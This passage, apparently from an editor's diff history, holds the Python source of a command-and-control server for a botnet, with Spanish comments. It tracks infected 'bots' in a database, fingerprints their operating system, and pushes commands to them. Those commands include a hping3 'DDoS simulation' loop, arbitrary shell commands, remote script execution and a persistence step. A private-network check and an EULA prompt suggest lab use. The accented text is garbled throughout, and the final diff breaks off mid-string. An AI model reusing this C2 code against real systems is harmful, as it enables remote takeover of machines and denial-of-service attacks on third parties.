sqlite3.PARSE_COLNAMES)\r\n+        cursor = conn.cursor()\r\n+        cursor.execute(\"UPDATE bots SET last_seen = ? WHERE ip = ?\", (datetime.now(), ip))\r\n+        conn.commit()\r\n+        conn.close()\r\n+        logging.info(f\"Bot actualizado en la base de datos: {ip}\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al actualizar el bot en la base de datos: {e}\")\r\n+\r\n+def manejar_bot(conn, addr, bot_id, config):\r\n+    \"\"\"\r\n+    Maneja una conexi贸n de bot y la agrega o actualiza en la base de datos.\r\n+\r\n+    :param conn: El socket del bot conectado.\r\n+    :type conn: socket.socket\r\n+    :param addr: La direcci贸n IP y puerto del bot.\r\n+    :type addr: tuple\r\n+    :param bot_id: El ID del bot, que se usar谩 para identificarlo.\r\n+    :type bot_id: int\r\n+    :param config: Un objeto con la configuraci贸n del servidor.\r\n+    \"\"\"\r\n+    try:\r\n+        ip, port = addr\r\n+        hostname = socket.gethostbyaddr(ip)[0]\r\n+        logging.info(f\"Bot {bot_id} conectado desde {addr}\")\r\n+        print(f\"Bot {bot_id} conectado desde {addr}\")\r\n+\r\n+        # Recibir identificador 煤nico\r\n+        identificador = conn.recv(1024).decode(\"utf-8\").strip()\r\n+        logging.info(f\"Identificador 煤nico recibido: {identificador}\")\r\n+\r\n+        # Detectar sistema operativo\r\n+        try:\r\n+            conn.send(\"detect_os\".encode(\"utf-8\"))\r\n+            os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n+            os = \"windows\" if \"windows\" in os_info else \"linux\"\r\n+            sistemas_operativos[conn] = os\r\n+            print(f\"Bot {bot_id} identificado como {os.capitalize()}\")\r\n+        except Exception as e:\r\n+            print(f\"Error al detectar OS de {addr}: {e}\")\r\n+            os = \"desconocido\"\r\n+\r\n+        agregar_o_actualizar_bot_en_db(config, identificador, ip, hostname, os)\r\n+\r\n+        while True:\r\n+            try:\r\n+                data = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n+                if not data:\r\n+                    continue\r\n+\r\n+                # Guardar la respuesta en el diccionario sin imprimirla\r\n+                respuestas_bots[bot_id] = data\r\n+                actualizar_bot_en_db(config, ip)\r\n+                agregar_respuesta_en_db(config, bot_id, data)\r\n+\r\n+            except socket.timeout:\r\n+                print(f\"Tiempo de espera agotado con {addr}.\")\r\n+            except Exception as e:\r\n+                print(f\"Error con {addr}: {e}\")\r\n+                break\r\n+\r\n+        # Manejo de desconexi贸n\r\n+        conn.close()\r\n+        logging.info(f\"Bot {bot_id} desconectado\")\r\n+        print(f\"Bot {bot_id} desconectado\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al manejar el bot {bot_id}: {e}\")\r\n+    finally:\r\n+        conn.close()\r\n+        logging.info(f\"Bot {bot_id} desconectado\")\r\n+        print(f\"Bot {bot_id} desconectado\")\r\n+\r\n+def servidor_CnC(HOST, PORT):\r\n+    global server_running\r\n+    \"\"\"\r\n+    Inicia el servidor de Comando y Control (CnC). Crea un socket, lo asocia\r\n+    a la IP y el puerto especificados y lo pone en escucha. Luego, crea un hilo\r\n+    para aceptar conexiones y entra en un bucle para mostrar un men煤 principal\r\n+    que permite al usuario interactuar con los bots conectados.\r\n+\r\n+    :return: None\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(f\"Iniciando servidor CnC en {HOST}:{PORT}\")\r\n+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Crear el socket\r\n+        server.bind((HOST, PORT)) # Asociar el socket a la IP y el puerto\r\n+        server.listen(5) # Escuchar conexiones\r\n+        print(f\"Escuchando en {HOST}:{PORT}...\") # Imprimir que el servidor esta escuchando\r\n+        \r\n+        threading.Thread(target=aceptar_conexiones, args=(server,)).start() # Crear un hilo para aceptar conexiones\r\n+\r\n+        while server_running:\r\n+            print(\"\\nMen煤 Principal:\")\r\n+            print(\"1. Listar bots conectados\")\r\n+            print(\"2. Enviar comandos\")\r\n+            print(\"3. Cerrar conexi贸n con un bot\")\r\n+            print(\"4. Salir\")\r\n+            opcion = input(\"Seleccione una opci贸n: \")\r\n+\r\n+            if opcion == \"1\":\r\n+                listar_bots()\r\n+            elif opcion == \"2\":\r\n+                menu_comandos()\r\n+            elif opcion == \"3\":\r\n+                cerrar_conexion_bots()\r\n+            elif opcion == \"4\":\r\n+                logging.info(\"Servidor CnC detenido\")\r\n+                print(\"Saliendo de la consola...\")\r\n+                server_running = False\r\n+                server.close()\r\n+                break\r\n+            else:\r\n+                print(\"Opci贸n no v谩lida. Intente de nuevo.\")\r\n+        \r\n+        # Esperar a que todos los hilos de bots terminen\r\n+        for bot in bots:\r\n+            bot.close()\r\n+        for thread in threading.enumerate():\r\n+            if thread is not threading.current_thread():\r\n+                thread.join()\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en el servidor CnC: {e}\")\r\n+\r\n+def aceptar_conexiones(server):\r\n+    global server_running\r\n+    \"\"\"\r\n+    Acepta conexiones de bots y las asigna a un hilo para manejarlas.\r\n+\r\n+    Este hilo infinito espera conexiones de bots y las asigna a la lista de\r\n+    bots conectados. A cada bot se le asigna un ID 煤nico y se crea un hilo\r\n+    para manejar la conexi贸n. El hilo maneja_bot se encarga de recibir los\r\n+    mensajes del bot, detectar el sistema operativo y ejecutar comandos\r\n+    enviados por el usuario.\r\n+\r\n+    :param server: El socket del servidor C&C.\r\n+    :type server: socket.socket\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Aceptando conexiones de bots\")\r\n+        bot_id = 1 # Contador de bots\r\n+        while server_running:\r\n+            try:\r\n+                conn, addr = server.accept() # Aceptar la conexi贸n\r\n+                bots.append(conn) # Agregar el bot a la lista\r\n+                bot_ids[conn] = bot_id # Asignar el ID del bot\r\n+                threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start() # Crear un hilo para manejar la conexi贸n\r\n+                bot_id += 1 # Incrementar el contador de bots\r\n+            except OSError:\r\n+                if not server_running:\r\n+                    break\r\n+                else:\r\n+                    raise\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al aceptar conexiones: {e}\")\r\n+\r\n+def listar_bots():\r\n+    \"\"\"\r\n+    Muestra la lista de bots conectados al servidor C&C, incluyendo\r\n+    su identificador, sistema operativo y direcci贸n IP y puerto de\r\n+    conexi贸n.\r\n+    \r\n+    :return: None\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Listando bots conectados\")\r\n+        if bots:\r\n+            print(\"\\nBots conectados:\")\r\n+            for bot in bots: # Recorrer la lista de bots\r\n+                so = sistemas_operativos.get(bot, \"Desconocido\") # Obtener el SO del bot\r\n+                print(f\"Bot {bot_ids[bot]} ({so.capitalize()}): {bot.getpeername()}\") # Imprimir el bot\r\n+        else:\r\n+            print(\"No hay bots conectados.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al listar bots: {e}\")\r\n+\r\n+def menu_comandos():\r\n+    \r\n+    \"\"\"\r\n+    Muestra el men煤 de comandos disponibles para ejecutar en los bots\r\n+    conectados y permite al usuario seleccionar una orden para ejecutar en\r\n+    todos los bots o en algunos seleccionados manualmente.\r\n+\r\n+    :return: None\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Mostrando men煤 de comandos\")\r\n+        if not bots:\r\n+            print(\"No hay bots conectados.\")\r\n+            return\r\n+\r\n+        print(\"\\nSeleccione el tipo de comandos:\")\r\n+        print(\"1. Comandos b谩sicos\")\r\n+        print(\"2. Comandos avanzados\")\r\n+        tipo_comando = input(\"Ingrese su opci贸n: \")\r\n+\r\n+        if tipo_comando == \"1\":\r\n+            print(\"\\nComandos b谩sicos disponibles:\")\r\n+            print(\"1. Obtener informaci贸n del sistema\")\r\n+            print(\"2. Consultar conexiones de red\")\r\n+            print(\"3. Ver procesos en ejecuci贸n\")\r\n+            print(\"4. Listar archivos en el directorio actual\")\r\n+            print(\"5. Obtener la IP p煤blica\")\r\n+            orden = input(\"Seleccione una orden: \")\r\n+            comando_windows = \"\"\r\n+            comando_linux = \"\"\r\n+\r\n+            if orden == \"1\":\r\n+                comando_windows = \"systeminfo\"\r\n+                comando_linux = \"uname -a && lsb_release -a\"\r\n+            elif orden == \"2\":\r\n+                comando_windows = \"netstat -ano\"\r\n+                comando_linux = \"netstat -tunapl\"\r\n+            elif orden == \"3\":\r\n+                comando_windows = \"tasklist\"\r\n+                comando_linux = \"ps aux\"\r\n+            elif orden == \"4\":\r\n+                comando_windows = \"dir\"\r\n+                comando_linux = \"ls -lah\"\r\n+            elif orden == \"5\":\r\n+                comando_windows = \"curl ifconfig.me\"\r\n+                comando_linux = \"curl ifconfig.me\"\r\n+            else:\r\n+                print(\"Opci贸n no v谩lida.\")\r\n+                return\r\n+\r\n+            enviar_comando(comando_windows, comando_linux)\r\n+\r\n+        elif tipo_comando == \"2\":\r\n+            print(\"\\nComandos avanzados disponibles:\")\r\n+            print(\"1. Simular ataque DDoS\")\r\n+            print(\"2. Detener simulaci贸n de DDoS\")\r\n+            print(\"3. Ejecutar un comando personalizado\")\r\n+            print(\"4. Ejecutar un script remoto\")\r\n+            print(\"5. Intentar asegurar la persistencia\")\r\n+            orden = input(\"Seleccione una orden: \")\r\n+            comando_windows = \"\"\r\n+            comando_linux = \"\"\r\n+\r\n+            if orden == \"1\":\r\n+                objetivo = input(\"Ingrese la direcci贸n IP del objetivo: \")\r\n+                puerto = input(\"Ingrese el puerto del objetivo: \")\r\n+                protocolo = input(\"Ingrese el protocolo (TCP/UDP): \").upper()\r\n+                if protocolo not in [\"TCP\", \"UDP\"]:\r\n+                    print(\"Protocolo no v谩lido.\")\r\n+                    return\r\n+                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n+                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n+                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n+            elif orden == \"2\":\r\n+                comando_windows = \"stop_ddos\"\r\n+                comando_linux = \"stop_ddos\"\r\n+                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n+            elif orden == \"3\":\r\n+                comando_windows = input(\"Ingrese el comando personalizado para Windows: \")\r\n+                comando_linux = input(\"Ingrese el comando personalizado para Linux: \")\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"4\":\r\n+                print(\"Seleccione el tipo de script:\")\r\n+                print(\"1. Python\")\r\n+                print(\"2. Bash\")\r\n+                print(\"3. Otro (especificar)\")\r\n+                \r\n+                tipo = input(\"Ingrese la opci贸n: \")\r\n+\r\n+                if tipo == \"1\":\r\n+                    extension = \"py\"\r\n+                    interprete_linux = \"python3 -c\"\r\n+                    interprete_windows = \"python -c\"\r\n+                elif tipo == \"2\":\r\n+                    extension = \"sh\"\r\n+                    interprete_linux = \"bash -c\"\r\n+                    interprete_windows = \"powershell -Command\"\r\n+                elif tipo == \"3\":\r\n+                    extension = input(\"Ingrese la extensi贸n del script (ejemplo: ps1, rb, pl): \")\r\n+                    interprete_linux = input(\"Ingrese el comando para ejecutarlo en Linux: \")\r\n+                    interprete_windows = input(\"Ingrese el comando para ejecutarlo en Windows: \")\r\n+                else:\r\n+                    print(\"Opci贸n inv谩lida.\")\r\n+                    return\r\n+\r\n+                print(\"\\n驴C贸mo desea proporcionar el script?\")\r\n+                print(\"1. Escribirlo aqu铆\")\r\n+                print(\"2. Proporcionar la ruta de un archivo\")\r\n+                \r\n+                metodo = input(\"Ingrese la opci贸n: \")\r\n+\r\n+                if metodo == \"1\":\r\n+                    print(f\"Escriba su script en {extension}. Finalice con 'EOF' en una l铆nea nueva:\")\r\n+                    lineas = []\r\n+                    while True:\r\n+                        try:\r\n+                            linea = input()\r\n+                            if linea.strip().upper() == \"EOF\":  # Detectar EOF\r\n+                                break\r\n+                            lineas.append(linea)\r\n+                        except KeyboardInterrupt:  # Capturar Ctrl+C para salir\r\n+                            print(\"\\nEntrada cancelada.\")\r\n+                            return\r\n+                    script = \"\\n\".join(lineas)  # Unir l铆neas en una sola cadena\r\n+                elif metodo == \"2\":\r\n+                    ruta = input(\"Ingrese la ruta del archivo: \")\r\n+                    try:\r\n+                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n+                            script = archivo.read()\r\n+                    except Exception as e:\r\n+                        print(f\"Error al leer el archivo: {e}\")\r\n+                        return\r\n+                else:\r\n+                    print(\"Opci贸n inv谩lida.\")\r\n+                    return\r\n+\r\n+                # Reemplazar comillas para evitar problemas con la ejecuci贸n remota\r\n+                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n+\r\n+                comando_windows = f'{interprete_windows} \"{script}\"'\r\n+                comando_linux = f\"{interprete_linux} '{script}'\"\r\n+\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"5\":\r\n+                print(\"\\nIntentando asegurar la persistencia en los bots seleccionados...\")\r\n+                comando_windows = \"persistencia\"\r\n+                comando_linux = \"persistencia\"\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            else:\r\n+                print(\"Opci贸n no v谩lida.\")\r\n+                return\r\n+        else:\r\n+            print(\"Opci贸n no v谩lida.\")\r\n+            return\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en el men煤 de comandos: {e}\")\r\n+\r\n+def enviar_comando(comando_windows, comando_linux, tipo_comando=None):\r\n+    \r\n+    \"\"\"\r\n+    Env铆a un comando a un conjunto de bots seleccionados.\r\n+\r\n+    :param comando_windows: El comando a enviar a los bots Windows.\r\n+    :type comando_windows: str\r\n+    :param comando_linux: El comando a enviar a los bots Linux.\r\n+    :type comando_linux: str\r\n+    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n+    :type tipo_comando: str\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Enviando comando a los bots seleccionados\")\r\n+        if not bots:\r\n+            print(\"No hay bots conectados.\")\r\n+            return\r\n+\r\n+        print(\"\\nSeleccione a qu茅 bots enviar el comando:\")\r\n+        print(\"1. Todos los bots\")\r\n+        print(\"2. Solo bots Windows\")\r\n+        print(\"3. Solo bots Linux\")\r\n+        print(\"4. Un bot espec铆fico\")\r\n+        print(\"5. Lista de bots espec铆ficos\")\r\n+\r\n+        seleccion = input(\"Ingrese su opci贸n: \")\r\n+        bots_seleccionados = []\r\n+\r\n+        if seleccion == \"1\":\r\n+            bots_seleccionados = bots\r\n+        elif seleccion == \"2\":\r\n+            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"windows\"]\r\n+        elif seleccion == \"3\":\r\n+            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"linux\"]\r\n+        elif seleccion == \"4\":\r\n+            listar_bots()\r\n+            try:\r\n+                bot_id = int(input(\"Ingrese el ID del bot: \"))\r\n+                bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)\r\n+                if bot:\r\n+                    bots_seleccionados.append(bot)\r\n+                else:\r\n+                    print(\"ID de bot no v谩lido.\")\r\n+                    return\r\n+            except ValueError:\r\n+                print(\"ID inv谩lido. Debe ingresar un n煤mero.\")\r\n+                return\r\n+        elif seleccion == \"5\":\r\n+            listar_bots()\r\n+            try:\r\n+                bot_ids_seleccionados = [int(id.strip()) for id in input(\"Ingrese los IDs de los bots separados por comas: \").split(\",\") if id.strip().isdigit()]\r\n+                bots_seleccionados = [b for b in bots if bot_ids.get(b) in bot_ids_seleccionados]\r\n+                if not bots_seleccionados:\r\n+                    print(\"No se encontraron bots con los IDs proporcionados.\")\r\n+                    return\r\n+            except ValueError:\r\n+                print(\"Entrada inv谩lida. Debe ingresar n煤meros separados por comas.\")\r\n+                return\r\n+        else:\r\n+            print(\"Opci贸n no v谩lida.\")\r\n+            return\r\n+\r\n+        respuestas = {}\r\n+\r\n+        for bot in bots_seleccionados:\r\n+            respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando)\r\n+\r\n+        print(\"\\n--- Respuestas de los bots ---\\n\")\r\n+        for bot, respuesta in respuestas.items():\r\n+            bot_info = f\"Bot {bot_ids.get(bot, 'Desconocido')} ({sistemas_operativos.get(bot, 'Desconocido').capitalize()})\"\r\n+            print(f\"[] {bot_info}: {respuesta}\")\r\n+\r\n+        print(\"\\n--- Volviendo al men煤 principal ---\\n\")\r\n+        time.sleep(2)\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando: {e}\")\r\n+\r\n+def enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando=None):\r\n+    \r\n+    \"\"\"\r\n+    Env铆a un comando a un bot espec铆fico basado en su sistema operativo.\r\n+\r\n+    Determina el sistema operativo del bot y env铆a el comando adecuado \r\n+    para Windows o Linux. Espera una respuesta del bot por un tiempo \r\n+    m谩ximo definido y devuelve la respuesta si se recibe. Maneja la \r\n+    desconexi贸n del bot si ocurre durante la comunicaci贸n.\r\n+\r\n+    :param bot: El socket del bot al que se enviar谩 el comando.\r\n+    :param comando_windows: El comando a ejecutar si el bot es Windows.\r\n+    :param comando_linux: El comando a ejecutar si el bot es Linux.\r\n+    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n+    :type tipo_comando: str\r\n+    :return: La respuesta del bot o un mensaje de error si no se recibe \r\n+             respuesta o si el bot se desconecta.\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(f\"Enviando comando al bot {bot_ids.get(bot, 'Desconocido')}\")\r\n+        so = sistemas_operativos.get(bot, \"desconocido\")\r\n+        comando = comando_windows if so == \"windows\" else comando_linux\r\n+        bot_id = bot_ids.get(bot, \"Desconocido\")\r\n+\r\n+        try:\r\n+            bot.send(comando.encode('utf-8'))\r\n+            print(f\"\\n[] Orden enviada a bot {bot_id} ({so.capitalize()})\\n\")\r\n+\r\n+            # Esperar hasta que `manejar_bot()` almacene la respuesta\r\n+            tiempo_maximo = 5  # Segundos\r\n+            tiempo_inicial = time.time()\r\n+\r\n+            while time.time() - tiempo_inicial < tiempo_maximo:\r\n+                if bot_id in respuestas_bots:\r\n+                    respuesta = respuestas_bots.pop(bot_id)  # Tomar y eliminar la respuesta\r\n+                    if tipo_comando == \"ddos_start\":\r\n+                        ddos_status[bot_id] = \"running\"\r\n+                    elif tipo_comando == \"ddos_stop\":\r\n+                        ddos_status[bot_id] = \"stopped\"\r\n+                    print(f\"\\n--- Respuesta del Bot {bot_id} ---\\n{respuesta}\\n\")\r\n+                    return respuesta if respuesta else \"[INFO] Comando ejecutado sin salida\"\r\n+                time.sleep(0.5)  # Esperar 0.5 segundos antes de verificar nuevamente\r\n+\r\n+            return \"[ERROR] No hubo respuesta del bot (Timeout)\"\r\n+\r\n+        except (socket.error, BrokenPipeError):\r\n+            print(f\"[] Bot {bot_id} desconectado.\")\r\n+            if bot in bots:\r\n+                bots.remove(bot)\r\n+            if bot in bot_ids:\r\n+                del bot_ids[bot]\r\n+            if bot in sistemas_operativos:\r\n+                del sistemas_operativos[bot]\r\n+            return \"[ERROR] El bot se ha desconectado.\"\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando al bot {bot_ids.get(bot, 'Desconocido')}: {e}\")\r\n+\r\n+def cerrar_conexion_bots():\r\n+    \r\n+    \"\"\"\r\n+    Cierra la conexi贸n con un bot seleccionado por el usuario.\r\n+    \r\n+    El usuario puede seleccionar a los bots a los que quiere cerrar la conexi贸n\r\n+    mediante un ID o bien escribir \"todos\" para cerrar la conexi贸n con todos\r\n+    los bots conectados.\r\n+    \r\n+    :return: None\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Cerrando conexi贸n con los bots seleccionados\")\r\n+        if not bots:\r\n+            print(\"No hay bots conectados.\")\r\n+            return\r\n+\r\n+        listar_bots()\r\n+        \r\n+        try:\r\n+            bot_id = int(input(\"Seleccione el ID del bot cuya conexi贸n quiere cerrar: \")) # Obtener el ID del bot seleccionado\r\n+        except ValueError:\r\n+            print(\"ID inv谩lido. Debe ingresar un n煤mero.\")\r\n+            return\r\n+\r\n+        bot = next((b for b in bots if bot_ids.get(b) == bot_id), None) # Buscar el bot con el ID correspondiente\r\n+        \r\n+        if not bot: # Si no se encuentra el bot\r\n+            print(f\"ID de bot {bot_id} no v谩lido.\") # Imprimir un mensaje de error\r\n+            return\r\n+\r\n+        try:\r\n+            bot.close() # Cerrar la conexi贸n\r\n+            print(f\"Conexi贸n con el bot {bot_id} cerrada.\") # Imprimir un mensaje de confirmaci贸n\r\n+        except Exception as e:\r\n+            print(f\"Error al cerrar la conexi贸n con el bot {bot_id}: {e}\")\r\n+\r\n+        if bot in bots:\r\n+            bots.remove(bot) # Eliminar el bot de la lista\r\n+\r\n+        if bot in bot_ids:\r\n+            del bot_ids[bot] # Eliminar el ID del bot\r\n+\r\n+        if bot in sistemas_operativos:\r\n+            del sistemas_operativos[bot] # Eliminar el SO del bot\r\n+\r\n+        print(f\"Bot {bot_id} eliminado correctamente del sistema.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al cerrar conexi贸n con los bots: {e}\")\r\n+\r\n+def cargar_configuracion():\r\n+    \r\n+    \"\"\"\r\n+    Carga la configuraci贸n del servidor desde un archivo \"config.ini\" ubicado\r\n+    en el directorio \"config\" del proyecto.\r\n+\r\n+    La configuraci贸n se almacena en un objeto con las siguientes claves:\r\n+        * BASE_DIR: Directorio base del proyecto.\r\n+        * HOST: Direcci贸n IP del servidor.\r\n+        * PORT: Puerto de escucha del servidor.\r\n+        * MAX_CONNECTIONS: N煤mero m谩ximo de conexiones permitidas.\r\n+        * DB_PATH: Ruta del archivo de la base de datos.\r\n+        * SECRET_KEY: Clave secreta para la autenticaci贸n.\r\n+        * HASH_ALGORITHM: Algoritmo de hash para la autenticaci贸n.\r\n+        * LOG_LEVEL: Nivel de log (DEBUG, INFO, WARNING, ERROR, CRITICAL).\r\n+        * SERVER_LOG_FILE: Ruta del archivo de log.\r\n+\r\n+    Si no se encuentra el archivo de configuraci贸n o hay un error al leerlo,\r\n+    se muestra un mensaje de error y se sale del programa con un estado de\r\n+    error.\r\n+\r\n+    :return: Un objeto con la configuraci贸n cargada.\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Cargando configuraci贸n del servidor\")\r\n+        BASE_DIR = os.path.dirname(os.path.abspath(__file__))\r\n+        CONFIG_DIR = os.path.join(BASE_DIR, \"..\", \"config\")\r\n+        CONFIG_PATH = os.path.join(CONFIG_DIR, \"config.ini\")\r\n+\r\n+        if not os.path.exists(CONFIG_PATH):\r\n+            raise FileNotFoundError(f\"[ERROR] No se encontr贸 el archivo de configuraci贸n: {CONFIG_PATH}\")\r\n+\r\n+        config = configparser.ConfigParser()\r\n+        config.read(CONFIG_PATH)\r\n+\r\n+        return {\r\n+            \"BASE_DIR\": BASE_DIR,\r\n+            \"HOST\": config.get(\"NETWORK\", \"HOST\"),\r\n+            \"PORT\": config.getint(\"NETWORK\", \"PORT\"),\r\n+            \"MAX_CONNECTIONS\": config.getint(\"NETWORK\", \"MAX_CONNECTIONS\"),\r\n+            \"DB_PATH\": os.path.join(BASE_DIR, config.get(\"DATABASE\", \"DB_PATH\")),\r\n+            \"SECRET_KEY\": config.get(\"SECURITY\", \"SECRET_KEY\"),\r\n+            \"HASH_ALGORITHM\": config.get(\"SECURITY\", \"HASH_ALGORITHM\"),\r\n+            \"LOG_LEVEL\": config.get(\"LOGGING\", \"LOG_LEVEL\"),\r\n+            \"SERVER_LOG_FILE\": os.path.join(BASE_DIR, \"..\", config.get(\"LOGGING\", \"LOG_DIR\"), config.get(\"LOGGING\", \"SERVER_LOG_FILE\"))\r\n+        }\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al cargar la configuraci贸n: {e}\")\r\n+        exit(1)\r\n+\r\n+def iniciar_servidor():\r\n+    \"\"\"\r\n+    Inicializa el servidor de Comando y Control (C2) verificando primero\r\n+    que no se ejecute en una red privada y mostrando un aviso de EULA.\r\n+\r\n+    Luego, inicializa la base de datos, configura el sistema de logging y\r\n+    lanza el servidor de C2.\r\n+\r\n+    :return: None\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Iniciando servidor de Comando y Control (C2)\")\r\n+        config = cargar_configuracion()\r\n+        configurar_logging(config)  # Pasar el objeto de configuraci贸n en lugar de la cadena\r\n+        if not esRedPrivada(config[\"HOST\"]):\r\n+            input(\"[ERROR] No puedes ejecutar este servidor fuera de una red privada. Presione ENTER para cerrar.\")\r\n+            sys.exit(1)\r\n+        verificar_eula(\"servidor\")\r\n+        init_db(config[\"DB_PATH\"])\r\n+        servidor_CnC(config[\"HOST\"], config[\"PORT\"])\r\n+        logging.info(\"Servidor de Comando y Control (C2) iniciado correctamente\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al iniciar el servidor: {e}\")\r\n+\r\n+if __name__ == \"__main__\":\r\n+    try:\r\n+        iniciar_servidor()\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en la ejecuci贸n principal: {e}\")\n\\ No newline at end of file\n"
                },
                {
                    "date": 1740220295209,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -350,62 +350,11 @@\n         conn.close()\r\n         logging.info(f\"Bot {bot_id} desconectado\")\r\n         print(f\"Bot {bot_id} desconectado\")\r\n \r\n-def servidor_CnC(HOST, PORT):\r\n+def aceptar_conexiones(server, config):\r\n     global server_running\r\n     \"\"\"\r\n-    Inicia el servidor de Comando y Control (CnC). Crea un socket, lo asocia\r\n-    a la IP y el puerto especificados y lo pone en escucha. Luego, crea un hilo\r\n-    para aceptar conexiones y entra en un bucle para mostrar un men煤 principal\r\n-    que permite al usuario interactuar con los bots conectados.\r\n-\r\n-    :return: None\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(f\"Iniciando servidor CnC en {HOST}:{PORT}\")\r\n-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Crear el socket\r\n-        server.bind((HOST, PORT)) # Asociar el socket a la IP y el puerto\r\n-        server.listen(5) # Escuchar conexiones\r\n-        print(f\"Escuchando en {HOST}:{PORT}...\") # Imprimir que el servidor esta escuchando\r\n-        \r\n-        threading.Thread(target=aceptar_conexiones, args=(server,)).start() # Crear un hilo para aceptar conexiones\r\n-\r\n-        while server_running:\r\n-            print(\"\\nMen煤 Principal:\")\r\n-            print(\"1. Listar bots conectados\")\r\n-            print(\"2. Enviar comandos\")\r\n-            print(\"3. Cerrar conexi贸n con un bot\")\r\n-            print(\"4. Salir\")\r\n-            opcion = input(\"Seleccione una opci贸n: \")\r\n-\r\n-            if opcion == \"1\":\r\n-                listar_bots()\r\n-            elif opcion == \"2\":\r\n-                menu_comandos()\r\n-            elif opcion == \"3\":\r\n-                cerrar_conexion_bots()\r\n-            elif opcion == \"4\":\r\n-                logging.info(\"Servidor CnC detenido\")\r\n-                print(\"Saliendo de la consola...\")\r\n-                server_running = False\r\n-                server.close()\r\n-                break\r\n-            else:\r\n-                print(\"Opci贸n no v谩lida. Intente de nuevo.\")\r\n-        \r\n-        # Esperar a que todos los hilos de bots terminen\r\n-        for bot in bots:\r\n-            bot.close()\r\n-        for thread in threading.enumerate():\r\n-            if thread is not threading.current_thread():\r\n-                thread.join()\r\n-    except Exception as e:\r\n-        logging.error(f\"Error en el servidor CnC: {e}\")\r\n-\r\n-def aceptar_conexiones(server):\r\n-    global server_running\r\n-    \"\"\"\r\n     Acepta conexiones de bots y las asigna a un hilo para manejarlas.\r\n \r\n     Este hilo infinito espera conexiones de bots y las asigna a la lista de\r\n     bots conectados. A cada bot se le asigna un ID 煤nico y se crea un hilo\r\n@@ -414,876 +363,19 @@\n     enviados por el usuario.\r\n \r\n     :param server: El socket del servidor C&C.\r\n     :type server: socket.socket\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Aceptando conexiones de bots\")\r\n-        bot_id = 1 # Contador de bots\r\n-        while server_running:\r\n-            try:\r\n-                conn, addr = server.accept() # Aceptar la conexi贸n\r\n-                bots.append(conn) # Agregar el bot a la lista\r\n-                bot_ids[conn] = bot_id # Asignar el ID del bot\r\n-                threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start() # Crear un hilo para manejar la conexi贸n\r\n-                bot_id += 1 # Incrementar el contador de bots\r\n-            except OSError:\r\n-                if not server_running:\r\n-                    break\r\n-                else:\r\n-                    raise\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al aceptar conexiones: {e}\")\r\n-\r\n-def listar_bots():\r\n-    \"\"\"\r\n-    Muestra la lista de bots conectados al servidor C&C, incluyendo\r\n-    su identificador, sistema operativo y direcci贸n IP y puerto de\r\n-    conexi贸n.\r\n-    \r\n-    :return: None\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Listando bots conectados\")\r\n-        if bots:\r\n-            print(\"\\nBots conectados:\")\r\n-            for bot in bots: # Recorrer la lista de bots\r\n-                so = sistemas_operativos.get(bot, \"Desconocido\") # Obtener el SO del bot\r\n-                print(f\"Bot {bot_ids[bot]} ({so.capitalize()}): {bot.getpeername()}\") # Imprimir el bot\r\n-        else:\r\n-            print(\"No hay bots conectados.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al listar bots: {e}\")\r\n-\r\n-def menu_comandos():\r\n-    \r\n-    \"\"\"\r\n-    Muestra el men煤 de comandos disponibles para ejecutar en los bots\r\n-    conectados y permite al usuario seleccionar una orden para ejecutar en\r\n-    todos los bots o en algunos seleccionados manualmente.\r\n-\r\n-    :return: None\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Mostrando men煤 de comandos\")\r\n-        if not bots:\r\n-            print(\"No hay bots conectados.\")\r\n-            return\r\n-\r\n-        print(\"\\nSeleccione el tipo de 